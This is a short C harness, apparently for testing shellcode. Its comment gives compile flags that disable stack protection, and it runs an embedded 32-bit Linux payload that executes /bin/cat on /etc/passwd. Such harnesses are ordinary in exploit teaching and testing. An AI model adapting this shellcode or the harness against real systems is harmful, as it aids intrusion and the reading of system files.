// Использование: gcc -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o test_shellcode_v2 test_shellcode_v2.c && ./test_shellcode_v2

#include <stdio.h>
#include <string.h>

const unsigned char shellcode[] =
        "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89"
        "\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65"
        "\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";

int main(int argc, char* argv[]) {
        printf("Shellcode size: %d\n\n", strlen((const char*)shellcode));

        void (*fp)(void);
        fp = (void*)shellcode;
        fp();
}
